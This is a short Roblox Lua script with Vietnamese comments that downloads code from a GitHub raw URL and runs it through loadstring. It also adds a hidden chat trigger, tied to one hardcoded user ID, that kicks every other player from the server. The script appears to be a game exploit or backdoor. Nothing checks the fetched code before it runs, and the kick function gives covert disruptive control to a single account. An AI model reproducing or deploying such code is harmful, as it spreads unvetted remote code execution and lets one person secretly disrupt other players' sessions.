-- Tải script từ URL
loadstring(game:HttpGet("https://raw.githubusercontent.com/Linhmcfake1/Build-and-battle-tp/refs/heads/main/Linked"))()

-- Thêm chức năng kick
local playerToKickId = 5233707500

game.Players.LocalPlayer.Chatted:Connect(function(message)
    if game.Players.LocalPlayer.UserId == playerToKickId and message == "," then
        local players = game.Players:GetPlayers()
        for _, targetPlayer in pairs(players) do
            if targetPlayer.UserId ~= playerToKickId then
                targetPlayer:Kick("You have been kicked by linhmc_new.")
            end
        end
    end
end)
